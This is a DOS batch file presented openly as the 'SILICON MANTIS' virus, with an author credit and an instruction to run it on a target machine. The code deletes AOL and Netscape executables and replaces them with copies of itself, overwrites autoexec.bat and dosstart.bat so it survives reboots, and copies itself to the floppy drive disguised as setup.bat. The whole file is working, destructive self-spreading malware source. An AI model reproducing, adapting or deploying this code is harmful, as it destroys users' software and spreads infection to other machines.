   @echo off
   rem virus created by |<urruppt2k, April 1999
   rem if this file is in 'mantis.vir' format, rename it 'mantis.bat' and execute it on the target machine.
   rem INITIALIZE (mantis prepares itself and its environment for operation)
   rem ***temporaroly rename infectation so mantis can refer to itself by name***
   if exist c:\netscape\commun~1\program\netscape.bat ren c:\netscape\commun~1\program\netscape.bat mantis.bat
   if exist c:\aol\aol.bat ren c:\aol\aol.bat mantis.bat
   if exist c:\aol30\aol.bat ren c:\aol30\aol.bat mantis.bat
   if exist c:\aol40\aol.bat ren c:\aol30\aol.bat mantis.bat
   if exist c:\progra~1\intern~1\iexplore.bat ren c:\progra~1\intern~1\iexplore.bat mantis.bat
   rem ***append and path dirs so mantis can refer to itself wherever it is***
   md mtemp > nul
   copy mantis.bat c:\mtemp > nul
   ren c:\mtemp\mantis.bat autoexec.bat > nul
   replace c:\autoexec.bat c:\mtemp > nul
   copy mantis.bat c:\mtemp > nul
   ren c:\mtemp\mantis.bat dosstart.bat > nul
   replace c:\windows\dosstart.bat c:\mtemp > nul
   deltree /y c:\mtemp > nul
   rem ***mantis looks for certain executables to replace with itself***
   if exist c:\aol\aol.exe goto sub_aol
   :2
   if exist c:\aol30\aol.exe goto sub_aol30
   :3
   if exist c:\aol40\aol.exe goto sub_aol40
   :4
   if exist c:\netscape\commun~1\program\netscape.exe goto sub_netscape
   :5
   if exist c:\progra~1\intern~1\iexplore.exe goto sub_mie
   ***specific internet app infectation proccess***
   :sub_aol
   del c:\aol\aol.exe > nul
   copy mantis.bat c:\aol > nul
   ren c:\aol\mantis.bat aol.bat > nul
   goto 2
   :sub_aol30
   del c:\aol30\aol.exe > nul
   copy mantis.bat c:\aol30 > nul
   ren c:\aol30\mantis.bat aol.bat > nul
   goto 3
   :sub_aol40
   del c:\aol40\aol.exe > nul
   copy mantis.bat c:\aol40 > nul
   ren c:\aol40\mantis.bat aol.bat > nul
   goto 4
   :sub_netscape
   del c:\netscape\commun~1\program\netscape.exe > nul
   copy mantis.bat c:\netscape\commun~1\program > nul
   ren c:\netscape\commun~1\program\mantis.bat netscape.bat > nul
   goto 5
   :sub_mie
   copy mantis.bat a:\ > nul
   ren mantis.bat setup.bat > nul
   rem ***rename mantis.bat back to 'app'.bat***
   if exist c:\aol\mantis.bat ren c:\aol\mantis.bat aol.bat
   if exist c:\aol30\mantis.bat ren c:\aol30\mantis.bat aol.bat
   if exist c:\aol40\mantis.bat ren c:\aol40\mantis.bat aol.bat
   if exist c:\netscape\commun~1\program\mantis.bat ren c:\netscape\commun~1\program\mantis.bat netscape.bat
   if exist c:\progra~1\intern~1\mantis.bat ren c:\progra~1\intern~1\mantis.bat iexplore.bat
   cls
   echo Error opening requested application.
   echo Cause: computer is infected with the SILICON MANTIS virus.
   rem ***end of virus code***
